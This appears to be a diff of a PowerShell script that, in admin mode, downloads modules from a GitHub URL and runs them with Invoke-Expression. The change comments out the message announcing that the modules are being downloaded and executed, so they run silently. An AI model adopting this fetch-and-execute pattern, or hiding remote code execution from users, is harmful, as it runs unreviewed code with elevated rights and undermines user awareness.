@@ -28,7 +28,7 @@ function Invoke-Modules {
          Load modules from URL
         foreach ($module in $modules) {
             $url = "https://raw.githubusercontent.com/Annabxlla/art/refs/heads/master/modules/$module"
-            Write-Host "Downloading and executing $module from $url..." -ForegroundColor Green
+            #Write-Host "Downloading and executing $module from $url..." -ForegroundColor Green
             Invoke-Expression (Invoke-WebRequest $url -UseBasicP)
         }
     }
@@ -56,6 +56,7 @@ function Main {
 
     Write-Host "`nPress any key to exit..."
     [void][System.Console]::ReadKey($true)
+    Exit
 }
 
 # Make sure the script is running in admin mode.
@@ -71,3 +72,4 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 } else {
     Main -vars $args
 }
+
